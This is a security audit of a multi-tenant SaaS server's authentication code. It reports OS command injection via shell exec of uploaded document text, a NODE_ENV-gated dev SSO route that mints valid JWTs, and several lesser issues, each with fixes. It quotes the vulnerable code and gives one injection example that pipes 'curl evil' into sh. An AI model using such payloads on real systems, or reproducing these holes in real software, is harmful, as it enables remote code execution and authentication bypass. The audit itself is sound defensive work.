# GA Readiness Audit — Security & Authentication

**Date:** 2026-06-14
**Scope:** `server/` and `shared/` application code (auth, middleware, security-relevant routes). React client and raw DB schema/migrations out of scope.
**Method:** Net-new independent source review. No prior reports consulted.

---

## Executive Summary

**Verdict: NOT READY (conditional — clears to Ready once the two HIGH findings are fixed).**
Full summary with severity counts is repeated at the end of this document.

- **BLOCKER:** 0 · **HIGH:** 2 · **MEDIUM:** 3 · **LOW:** 2
- **Top blockers:** (1) post-auth OS command injection in `/api/analytics/upload-protocol`;
  (2) dev SSO backdoor minting valid JWTs, gated only on `NODE_ENV`.
- The auth/tenant-isolation core is otherwise strong (HS256-pinned JWT + rotation,
  fail-closed SAML, JWT-derived tenant context, bcrypt-12 + lockout, hashed SCIM tokens,
  allowlist CORS, double-submit CSRF, parameterized SQL, no hardcoded prod secrets).

---

## Findings

### [HIGH] OS command injection via uploaded protocol content (`/api/analytics/upload-protocol`)

**File:** `server/routes/analytics-routes.ts:88,128,148-150,285,308-310`

`extractedText` — derived from an attacker-uploaded PDF/document — is interpolated
directly into a shell command string and run through `child_process.exec`:

```ts
const result = await execPromise(`python ${analyzerScriptPath} "${extractedText}"`);   // line 128
```
and
```ts
`python -c "... open('${tempScoreFile}', 'r')...` // line 149 (filePath/text interpolated)
```

`exec` invokes `/bin/sh -c`, so any shell metacharacter in the extracted text
(`"; curl evil | sh; "`, `` $(...) ``, backticks) executes arbitrary commands on
the application host with the server's privileges. The file path at line 88/285
(`"${filePath}"`) is multer-generated and lower-risk, but the *content* path is fully
attacker-controlled.

**Reachability:** The global `/api` auth gate (`register-platform-routes.ts:235`)
is registered before this router is mounted (`startup/routes.ts:89` precedes the
analytics mount at `register-project-routes.ts:88-94`), so the endpoint requires a
valid session. This is therefore a **post-authentication RCE**: any authenticated
tenant user (lowest role) can execute code on the host and pivot to other tenants'
data, secrets, and the database. In a regulated multi-tenant SaaS this is a host
compromise / cross-tenant breach vector.

**Why it blocks GA:** Authenticated RCE on shared infrastructure breaks tenant
isolation at the OS level and is a critical control gap for SOC 2 / regulated launch.

**Fix:** Never build shell strings from input. Use `execFile`/`spawn('python3',
[script, filePath])` with an argument array (no shell), pass the document via a temp
file or stdin rather than as an argv string, and validate/normalize file paths. Remove
the `python -c "...open('${...}')..."` construction entirely in favor of a script file
that reads a path argument.

---

### [HIGH] Dev SSO backdoor mints valid production JWTs, gated only on `NODE_ENV`

**File:** `server/routes/sso.ts:19,422-471` (mounted at `register-platform-routes.ts:167-170`)

The generic SSO provider routes contain a development bypass:

```ts
const isDev = process.env.NODE_ENV === 'development';   // line 19
...
router.get('/:provider/initiate', ...) { if (isDev) { /* redirect with dev code */ } }
router.get('/:provider/callback', ...) {
  if (isDev) {
    const token = jwt.sign({ userId:'1', email:'sso-user@example.com',
      organizationId:'2', role:'client_user', provider }, config.jwt.secret, {expiresIn:'24h'});
    return res.redirect(302, `/concept2cure/login?...&sso_token=${token}...`);   // line 460-467
  }
}
```

This issues a **fully valid, signed JWT** for org `2` / user `1` to anyone who hits
`GET /api/auth/sso/<anything>/callback` whenever `NODE_ENV === 'development'`. It is
mounted unconditionally in all environments and gated *only* on `NODE_ENV`, not on the
project's hardened `isDevAuthAllowed()` gate (`server/auth/dev-auth-policy.ts`, which
requires `NODE_ENV==='development' && ALLOW_DEV_AUTH==='1'`). The repo even ships a CI
check (`ci:no-dev-auth-in-prod`) precisely to catch this pattern, but this route does
not use the policy helper.

**Why it blocks GA:** A misconfigured deploy (NODE_ENV unset/typo handled elsewhere,
or a staging box left at `development`) turns an unauthenticated GET into a tenant
login. The `/api/auth/*` prefix is on the auth-gate openlist, so these routes are
reachable **without authentication**. Auth-bypass backdoor reachable by env
misconfiguration is a launch blocker.

**Fix:** Gate both `isDev` branches behind `isDevAuthAllowed()` (the existing helper),
or delete the dev SSO mock entirely and return `501` in all environments until real
OAuth is implemented. Add the route to the `ci:no-dev-auth-in-prod` scan coverage.

---

### [MEDIUM] SAML JIT provisioning hard-codes default org (cross-org placement risk)

**File:** `server/routes/sso.ts:509,555,553-562` and `:226-227`

JIT-provisioned SAML users are unconditionally placed into `organizationId = 1`
(`defaultOrgId = 1`, line 555) and existing users with no org association also fall back
to org `1` (line 509). The org slug used to select the IdP trust anchor comes from
untrusted `RelayState` (lines 226-227) — which is correctly defended for *signature
validation* (a forged response can't validate against any org's cert), but the
**resulting user is still mapped to org 1 regardless of which org's IdP authenticated
them**. In a multi-tenant deployment serving several orgs via `SAML_TENANTS`, a user
authenticated by Org B's IdP is provisioned into Org A (id 1).

**Why it matters for GA:** Incorrect tenant assignment on SSO is a cross-tenant data
exposure / authorization defect for enterprise SSO customers.

**Fix:** Derive the target organization from the validated org slug (map slug → org id)
rather than a hard-coded constant, and reject provisioning when the slug doesn't map to
a known org. Add a contract test that an Org-B assertion never lands a user in Org A.

---

### [MEDIUM] SAML/SSO returns JWT in URL query string (token leakage)

**File:** `server/routes/sso.ts:283-288,460-467`

After SAML callback, the access token is appended to the same-origin `returnTo` path as
a **query parameter** (`?token=...`, line 285-287); the dev SSO callback likewise puts
`sso_token` in the redirect URL (line 462). Tokens in URLs leak via browser history,
`Referer` headers to any third-party resource on the landing page, server access logs,
and proxy logs. The code comment at line 459 claims "URL fragment ... not query string
for security," but the implementation uses a query string.

**Fix:** Deliver the token via a short-lived, `HttpOnly`+`Secure`+`SameSite` cookie or a
one-time exchange code redeemed by the SPA, not as a URL query parameter. At minimum use
the URL fragment (`#token=`) as the comment intends, though a cookie/exchange-code is the
correct GA pattern.

---

### [MEDIUM] Tenant isolation relies on application-level scoping; Postgres RLS not confirmed active

**File:** `server/middleware/tenantContext.ts:272-306` (esp. comment at 293-296)

The request DB client sets `app.current_tenant_id` / `app.current_user_role` /
`app.current_org_id` via `set_config` on a per-request connection, and reviewed routes
(e.g. `external-evidence.ts:82-138`) consistently filter `WHERE tenant_id = $1`. However
the in-code comment states the AsyncLocalStorage scope exists to "count which queries run
without a tenant boundary — the gap that would silently turn into 'zero rows' once RLS is
enabled in PR B," implying database-enforced RLS may not yet be active in all paths. With
~hundreds of route files and a single missing `WHERE tenant_id` clause sufficient to leak
cross-tenant rows, defense-in-depth RLS (`ENABLE/FORCE ROW LEVEL SECURITY` + policies
keyed on `app.current_tenant_id`) is the control that makes isolation robust against an
individual query bug.

**Why it matters for GA:** For regulated multi-tenant data, app-only scoping is a single
point of failure. RLS must be confirmed enabled and `FORCE`d on every tenant-scoped table
before GA. (DB schema/migrations are out of this report's scope — flagged for the DB/RLS
workstream to verify policies are live, not just that `set_config` runs.)

**Fix:** Confirm RLS is `ENABLE`d and `FORCE`d on all tenant tables with policies matching
`app.current_tenant_id`; add a CI/integration test that a query with the wrong tenant
context returns zero rows even when the `WHERE` clause is omitted.

---

### [LOW] `requireTenantContext` precondition checks bare `JWT_SECRET`, mismatching the env-suffixed verifier

**File:** `server/middleware/tenantContext.ts:170-175` vs `server/utils/jwtVerify.ts:40-49`

The middleware returns `503 Authentication unavailable` when `process.env.JWT_SECRET` is
falsy, but the verifier resolves `JWT_SECRET_<ENV>` (e.g. `JWT_SECRET_PROD`) *first* and
only falls back to bare `JWT_SECRET`. A production deployment that sets only
`JWT_SECRET_PROD` (the documented pattern in `config/environment.ts`) would have a working
verifier yet trip this 503 — a fail-closed availability bug, not a security hole, but it
contradicts the supported secret layout and could mask real auth during incident response.

**Fix:** Replace the bare-env check with the same resolution the verifier uses (or simply
let `verifyJwtWithRotation` throw and handle it), so the precondition matches the actual
secret source.

---

### [LOW] Generic `requireRole`/`requirePermission` grant implicit admin/wildcard escalation

**File:** `server/middleware/auth.ts:149-151,217-221`; `server/middleware/tenantIsolation.ts:178-191`

Authorization helpers treat membership of role `admin` as satisfying *any* role/permission
check (`!userRoles?.includes('admin')`, `req.tenant?.roles.includes('admin')`), and
`requirePermission` honors a `'*'` wildcard permission. This is conventional, but the
`admin` role here is the *organization* admin (from `organization_users.role`), so an org
admin implicitly passes every `requirePermission(...)` gate regardless of the specific
permission. Ensure no cross-tenant or platform-level capability is guarded solely by a
generic `requireRole('admin')` that an ordinary tenant admin can satisfy. Platform/super-
admin actions correctly use the separate `requireSuperAdminRole` (`server/auth.ts:160-166`),
which is good — this is a hardening note to audit that the two admin tiers are never
conflated on sensitive routes.

**Fix:** Keep tenant-admin and platform-admin authorities strictly separate; prefer
explicit permission grants over blanket admin-implies-all on any route that crosses tenant
or platform boundaries.

---

## Positive Controls Observed (not blockers)

- **JWT verification is hardened:** algorithm pinned to HS256 (`jwtVerify.ts:81`) — blocks
  alg-confusion; zero-downtime rotation with previous-secret fallback; min 32-char secret
  enforced at config load and fails loud (`config/environment.ts:103-128`).
- **No hardcoded production secrets** found in `server/`; the only hardcoded credential
  (`tamper-proof-audit.ts:138`) is a dev-only fallback that *throws* in production
  (`:125-131`). All real secrets come from `process.env`.
- **SAML is fail-closed** via `@node-saml/node-saml` with `wantAssertionsSigned: true`,
  audience pinning, InResponseTo/replay validation, SHA-256 (`saml-provider.ts:115-151`).
  Replaces a prior regex-based bypass. RelayState is correctly treated as untrusted for
  trust decisions.
- **Tenant org id is derived from the verified JWT, never from headers**; header-based
  impersonation attempts are detected and audit-logged as `critical`
  (`tenantIsolation.ts:55-73`, `tenantContext.ts`, `tenantAuth.ts`).
- **CSRF** uses a double-submit cookie with constant-time, fixed-length comparison and a
  precise exempt-path matcher that avoids prefix-confusion (`csrf.ts`).
- **CORS** is allowlist-based and blocks unknown origins in all environments; no wildcard
  with credentials in production (`enterprise-security.ts:312-351`).
- **Password hygiene:** bcrypt cost 12, legacy `temp_`/empty hashes rejected, account
  lockout, login rate limiting, password history, audit logging (`auth.ts`, `routes/auth.ts`).
- **SCIM** uses hashed tokens with constant-time compare, per-org source-IP allowlists,
  and dedicated rate limiting (`routes/scim.ts`).
- **SQL** in reviewed routes is parameterized (drizzle / `$1` placeholders); no string-
  concatenated SQL with request input was found in the security-critical paths reviewed.
- **Upload allowlist** rejects executable/script extensions and requires magic-byte +
  malware verification downstream (`uploadAllowlist.ts`).

---

## Executive Summary

**Verdict: NOT READY (conditional on fixing the two HIGH findings).**

The authentication and tenant-isolation core of this platform is, with two notable
exceptions, well-engineered for a regulated multi-tenant SaaS: HS256-pinned JWT
verification with rotation, fail-closed SAML via a vetted library, JWT-derived (never
header-derived) tenant context with re-checked DB membership, bcrypt-12 passwords with
lockout and rate limiting, hashed SCIM tokens, parameterized SQL, allowlist CORS, and a
correct double-submit CSRF. No hardcoded production secrets were found.

Two findings block GA:

1. **[HIGH] Post-auth OS command injection** in `/api/analytics/upload-protocol`
   (`analytics-routes.ts:128,148`): attacker-controlled uploaded-document *content* is
   interpolated into a `child_process.exec` shell string, giving any authenticated tenant
   user remote code execution on the shared host — an OS-level break of tenant isolation.

2. **[HIGH] Dev SSO backdoor** (`routes/sso.ts:444-467`) that mints valid signed JWTs and
   is gated only on `NODE_ENV === 'development'` instead of the project's hardened
   `isDevAuthAllowed()`. It is mounted unconditionally and reachable unauthenticated under
   the `/api/auth` open prefix, so an environment misconfiguration becomes an auth bypass.

Both are concrete, env- or input-triggerable, and must be fixed (and covered by the
existing `ci:no-dev-auth-in-prod` style guards) before launch.

**Count by severity:** BLOCKER 0 · HIGH 2 · MEDIUM 3 · LOW 2.

Conditional path to GA: remediate the two HIGH items (use `execFile`/argv arrays; gate or
delete the dev SSO mock), confirm Postgres RLS is `FORCE`d on tenant tables (MEDIUM #1),
fix SAML JIT org mapping and stop returning JWTs in URLs (MEDIUM #2/#3). After those, the
security/auth posture is GA-ready.


